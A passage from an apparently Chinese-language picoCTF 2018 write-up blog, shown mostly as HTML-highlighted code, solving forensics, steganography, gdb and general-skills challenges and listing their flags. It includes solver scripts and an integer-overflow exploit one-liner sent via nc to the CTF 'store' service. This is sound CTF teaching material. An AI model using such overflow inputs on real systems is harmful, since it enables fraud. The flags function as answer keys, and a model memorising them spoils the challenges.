class="number">11100</span>,<span class="number">11000</span>,<span class="number">10900</span>,<span class="number">10800</span>,<span class="number">10700</span>,<span class="number">11000</span>,<span class="number">11000</span>,<span class="number">10800</span>,</span><br><span class="line">    <span class="number">10900</span>,<span class="number">10700</span>,<span class="number">10900</span>,<span class="number">10800</span>,<span class="number">10750</span>,<span class="number">10950</span>,<span class="number">10900</span>,<span class="number">10800</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">'2018shell2.picoctf.com'</span>,<span class="number">39410</span>)</span><br><span class="line">prompt=r.recvuntil(<span class="string">'num_IPs'</span>)</span><br><span class="line">data=r.recv()</span><br><span class="line">nums=data.split()</span><br><span class="line"><span class="keyword">print</span> prompt,<span class="string">'\n'</span>,nums</span><br><span class="line">group=len(nums)/<span class="number">4</span></span><br><span class="line">res=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(group):</span><br><span class="line">t=nums[i*<span class="number">4</span>+<span class="number">2</span>].split(<span class="string">':'</span>)</span><br><span class="line">tt=int(t[<span class="number">0</span>])*<span class="number">4</span>+int(t[<span class="number">1</span>])/<span class="number">15</span></span><br><span class="line"><span class="keyword">if</span> int(nums[i*<span class="number">4</span>+<span class="number">3</span>])&gt;log[tt]:</span><br><span class="line">res.append(nums[i*<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">' '</span>.join(res))</span><br><span class="line"><span class="keyword">print</span> <span class="string">' '</span>.join(res),r.recv()</span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># [x] Opening connection to 2018shell2.picoctf.com on port 39410</span></span><br><span class="line"><span class="comment"># [x] Opening connection to 2018shell2.picoctf.com on port 39410: Trying 18.224.157.204</span></span><br><span class="line"><span class="comment"># [+] Opening connection to 2018shell2.picoctf.com on port 39410: Done</span></span><br><span class="line"><span class="comment"># You'll need to consult the file `traffic.png` to answer the following questions.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Which of these logs have significantly higher traffic than is usual for their time of day? You can see usual traffic on the attached plot. There may be multiple logs with higher than usual traffic, so answer all of them! Give your answer as a list of `log_ID` values separated by spaces. For example, if you want to answer that logs 2 and 7 are the ones with higher than usual traffic, type 2 7.</span></span><br><span class="line"><span class="comment">#     log_ID      time  num_IPs </span></span><br><span class="line"><span class="comment"># ['0', '0', '01:00:00', '11637', '1', '1', '01:30:00', '11640', '2', '2', '02:45:00', '11616', '3', '3', '10:45:00', '9962', '4', '4', '10:45:00', '10409', '5', '5', '11:45:00', '12732', '6', '6', '14:15:00', '10538', '7', '7', '16:15:00', '10233', '8', '8', '17:30:00', '10839', '9', '9', '20:15:00', '11936', '10', '10', '20:30:00', '9898', '11', '11', '21:45:00', '9653', '12', '12', '22:30:00', '10252', '13', '13', '23:15:00', '9619']</span></span><br><span class="line"><span class="comment"># 0 1 2 9 Correct!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Great job. You've earned the flag: picoCTF&#123;w4y_0ut_940df760&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [*] Closed connection to 2018shell2.picoctf.com port 39410</span></span><br><span class="line"><span class="comment"># [Finished in 3.6s]</span></span><br></pre></td></tr></table></figure><h2 id="What’s-My-Name"><a href="#What’s-My-Name" class="headerlink" title="What’s My Name?"></a>What’s My Name?</h2><p><code>picoCTF{w4lt3r_wh1t3_ddfad6f8f4255adc73e862e3cebeee9d}</code>  </p><p><img src="1538368152075.png" alt="1538368152075"></p><h2 id="Malware-Shops"><a href="#Malware-Shops" class="headerlink" title="Malware Shops"></a>Malware Shops</h2><p>附件貌似有问题，爆破出第一个答案是5，第二个随手交一下flag就出来了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ nc 2018shell2.picoctf.com 57920</span><br><span class="line">You<span class="string">'ll need to consult the file `clusters.png` to answer the following questions.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">How many attackers created the malware in this dataset?</span></span><br><span class="line"><span class="string">5</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">In the following sample of files from the larger dataset, which file was made by the same attacker who made the file 87847bfc? Indicate your answer by entering that file'</span>s <span class="built_in">hash</span>.</span><br><span class="line">       <span class="built_in">hash</span>  jmp_count  add_count</span><br><span class="line">0  87847bfc       32.0       29.0</span><br><span class="line">1  7eeed4b3       34.0       34.0</span><br><span class="line">2  ad5e4ce0       21.0       64.0</span><br><span class="line">3  628e79cf       14.0       26.0</span><br><span class="line">4  b5e53809       11.0       35.0</span><br><span class="line">5  ebaf5ccd       15.0       13.0</span><br><span class="line">6  94ad3582       37.0       10.0</span><br><span class="line">7  42f1d364       23.0       68.0</span><br><span class="line">8  93827b93       11.0       38.0</span><br><span class="line">9  c08300fe       41.0       10.0</span><br><span class="line">7eeed4b3</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Great job. You<span class="string">'ve earned the flag: picoCTF&#123;w4y_0ut_0915ebc6&#125;</span></span><br></pre></td></tr></table></figure><h2 id="LoadSomeBits"><a href="#LoadSomeBits" class="headerlink" title="LoadSomeBits"></a>LoadSomeBits</h2><p>最低有效位隐写，需要fuzz起始偏移。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat lsb.py</span></span><br><span class="line">import binascii</span><br><span class="line">lsb=<span class="string">''</span>.join(map(lambda x:str(ord(x)&amp;1),open(<span class="string">'pico2018-special-logo.bmp'</span>,<span class="string">'rb'</span>).<span class="built_in">read</span>()))</span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> range(16):</span><br><span class="line">        tmp=lsb[offset:]</span><br><span class="line">        tmps=<span class="string">''</span>.join(chr(int(tmp[i:i+8],2)) <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(tmp),8))</span><br><span class="line">        <span class="keyword">if</span>  <span class="string">'pico'</span> <span class="keyword">in</span> tmps:</span><br><span class="line">                <span class="built_in">print</span> tmps</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python lsb.py | strings | grep -o picoCTF&#123;.*&#125;</span></span><br><span class="line">picoCTF&#123;st0r3d_iN_tH3_l345t_s1gn1f1c4nT_b1t5_2903593693&#125;</span><br></pre></td></tr></table></figure><h2 id="core"><a href="#core" class="headerlink" title="core"></a>core</h2><p>core file或者core dunp是一个保存进程运行时内存镜像和进程状态（如寄存器的值等）的文件。没挂调试器的程序崩溃时一般会自动产生core文件用于post-mortem debugging。可以使用 <code>gdb  program [core dump]</code> 开始调试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x080487ec &lt;+0&gt;:     lea    ecx,[esp+0x4]</span><br><span class="line">   0x080487f0 &lt;+4&gt;:     and    esp,0xfffffff0</span><br><span class="line">   0x080487f3 &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x080487f6 &lt;+10&gt;:    push   ebp</span><br><span class="line">   0x080487f7 &lt;+11&gt;:    mov    ebp,esp</span><br><span class="line">   0x080487f9 &lt;+13&gt;:    push   ecx</span><br><span class="line">   0x080487fa &lt;+14&gt;:    sub    esp,0x4</span><br><span class="line">   0x080487fd &lt;+17&gt;:    call   0x80485bb &lt;load_strings&gt;</span><br><span class="line">   0x08048802 &lt;+22&gt;:    call   0x80487c1 &lt;print_flag&gt;</span><br><span class="line">   0x08048807 &lt;+27&gt;:    mov    eax,0x0</span><br><span class="line">   0x0804880c &lt;+32&gt;:    add    esp,0x4</span><br><span class="line">   0x0804880f &lt;+35&gt;:    pop    ecx</span><br><span class="line">   0x08048810 &lt;+36&gt;:    pop    ebp</span><br><span class="line">   0x08048811 &lt;+37&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">   0x08048814 &lt;+40&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disas print_flag</span><br><span class="line">Dump of assembler code for function print_flag:</span><br><span class="line">=&gt; 0x080487c1 &lt;+0&gt;:     push   ebp</span><br><span class="line">   0x080487c2 &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">   0x080487c4 &lt;+3&gt;:     sub    esp,0x18</span><br><span class="line">   0x080487c7 &lt;+6&gt;:     mov    DWORD PTR [ebp-0xc],0x539</span><br><span class="line">   0x080487ce &lt;+13&gt;:    mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x080487d1 &lt;+16&gt;:    mov    eax,DWORD PTR [eax*4+0x804a080]</span><br><span class="line">   0x080487d8 &lt;+23&gt;:    sub    esp,0x8</span><br><span class="line">   0x080487db &lt;+26&gt;:    push   eax ;flag字符串的地址保存在eax中</span><br><span class="line">   0x080487dc &lt;+27&gt;:    push   0x804894c</span><br><span class="line">   0x080487e1 &lt;+32&gt;:    call   0x8048410 &lt;printf@plt&gt;</span><br><span class="line">   0x080487e6 &lt;+37&gt;:    add    esp,0x10</span><br><span class="line">   0x080487e9 &lt;+40&gt;:    nop</span><br><span class="line">   0x080487ea &lt;+41&gt;:    leave</span><br><span class="line">   0x080487eb &lt;+42&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) x/sb *(0x804a080+4*0x539)</span><br><span class="line">0x80610f0:      &quot;c96bd0fa2da5c0853cf12c4f93fce288&quot;s</span><br></pre></td></tr></table></figure><p><code>picoCTF{c96bd0fa2da5c0853cf12c4f93fce288}</code>每个人的答案是不同的。</p><h1 id="General-Skills"><a href="#General-Skills" class="headerlink" title="General Skills"></a>General Skills</h1><h2 id="absolutely-relative"><a href="#absolutely-relative" class="headerlink" title="absolutely relative"></a>absolutely relative</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> yes_len 3</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *yes = <span class="string">"yes"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">99</span>];</span><br><span class="line">    <span class="keyword">char</span> permission[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    FILE * file;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    file = fopen(<span class="string">"/problems/absolutely-relative_2_69862edfe341b57b6ed2c62c7107daee/flag.txt"</span> , <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (file) &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">"%s"</span>, flag)!=EOF)</span><br><span class="line">    fclose(file);</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    file = fopen( <span class="string">"./permission.txt"</span> , <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (file) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(file, <span class="string">"%s"</span>, permission);</span><br><span class="line">        &#125;</span><br><span class="line">        permission[<span class="number">5</span>] = <span class="string">'\0'</span>;</span><br><span class="line">        fclose(file);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(permission, yes, yes_len)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"You have the write permissions.\n%s\n"</span>, flag);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"You do not have sufficient permissions to view the flag.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1539439034675.png" alt="1539439034675"></p><p><code>picoCTF{3v3r1ng_1$_r3l3t1v3_372b3859}</code> </p><h2 id="Aca-Shell-A"><a href="#Aca-Shell-A" class="headerlink" title="Aca-Shell-A"></a>Aca-Shell-A</h2><p><img src="1539139814957.png" alt="1539139814957"></p><p><img src="1539139848050.png" alt="1539139848050"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;CrUsHeD_It_17ab99f5&#125;</span><br></pre></td></tr></table></figure><h2 id="in-out-error"><a href="#in-out-error" class="headerlink" title="in out error"></a>in out error</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"Please may I have the flag?"</span> | ./<span class="keyword">in</span>-out-error  &gt; ~/result.txt</span><br><span class="line"><span class="comment">#picoCTF&#123;p1p1ng_1S_4_7h1ng_f37fb67e&#125;</span></span><br></pre></td></tr></table></figure><h2 id="learn-gdb"><a href="#learn-gdb" class="headerlink" title="learn gdb"></a>learn gdb</h2><p><code>picoCTF{gDb_iS_sUp3r_u53fuL_f3f39814}</code> </p><p><img src="1538828295272.png" alt="1538828295272"></p><h2 id="store"><a href="#store" class="headerlink" title="store"></a>store</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="meta"># curl https:<span class="comment">//2018shell2.picoctf.com/static/655fb38d2f256165a0163d4a606f998a/source.c</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> con;</span><br><span class="line">    con = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> account_balance = <span class="number">1100</span>;</span><br><span class="line">    <span class="keyword">while</span>(con == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to the Store App V1.0\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"World's Most Secure Purchasing App\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n[1] Check Account Balance\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n[2] Buy Stuff\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n[3] Exit\n"</span>);</span><br><span class="line">        <span class="keyword">int</span> menu;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n Enter a menu selection\n"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</span><br><span class="line">        <span class="keyword">if</span>(menu == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\n\n Balance: %d \n\n\n"</span>, account_balance);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(menu == <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Current Auctions\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[1] I Can't Believe its not a Flag!\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[2] Real Flag\n"</span>);</span><br><span class="line">            <span class="keyword">int</span> auction_choice;</span><br><span class="line">            fflush(<span class="built_in">stdin</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;auction_choice);</span><br><span class="line">            <span class="keyword">if</span>(auction_choice == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Imitation Flags cost 1000 each, how many would you like?\n"</span>);</span><br><span class="line">                <span class="keyword">int</span> number_flags = <span class="number">0</span>;</span><br><span class="line">                fflush(<span class="built_in">stdin</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;number_flags);</span><br><span class="line">                <span class="keyword">if</span>(number_flags &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">int</span> total_cost = <span class="number">0</span>;</span><br><span class="line">                    total_cost = <span class="number">1000</span>*number_flags;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"\nYour total cost is: %d\n"</span>, total_cost);</span><br><span class="line">                    <span class="keyword">if</span>(total_cost &lt;= account_balance)&#123;</span><br><span class="line">                        account_balance = account_balance - total_cost;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"\nYour new balance: %d\n\n"</span>, account_balance);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"Not enough funds\n"</span>);</span><br><span class="line">                    &#125;   </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(auction_choice == <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"A genuine Flag costs 100000 dollars, and we only have 1 in stock\n"</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Enter 1 to purchase"</span>);</span><br><span class="line">                <span class="keyword">int</span> bid = <span class="number">0</span>;</span><br><span class="line">                fflush(<span class="built_in">stdin</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bid);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(bid == <span class="number">1</span>)&#123;                </span><br><span class="line">                    <span class="keyword">if</span>(account_balance &gt; <span class="number">100000</span>)&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"YOUR FLAG IS:\n"</span>);</span><br><span class="line">                        &#125;                 </span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"\nNot enough funds for transaction\n\n\n"</span>);</span><br><span class="line">                    &#125;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            con = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整数溢出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'print "2\n1\n"+str(((1100-100001)+2**32)/1000)+"\n2\n2\n1\n3\n"'</span> | nc 2018shell2.picoctf.com 43581 | grep pico</span><br><span class="line"><span class="comment"># Enter 1 to purchaseYOUR FLAG IS: picoCTF&#123;numb3r3_4r3nt_s4f3_6bd13a8c&#125;</span></span><br></pre></td></tr></table></figure><h2 id="roulette"><a href="#roulette" class="headerlink" title="roulette"></a>roulette</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_NUM_LEN 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOTSTREAK 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_WINS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ONE_BILLION 1000000000</span></span><br><span class="line"><span class="meta">#<span 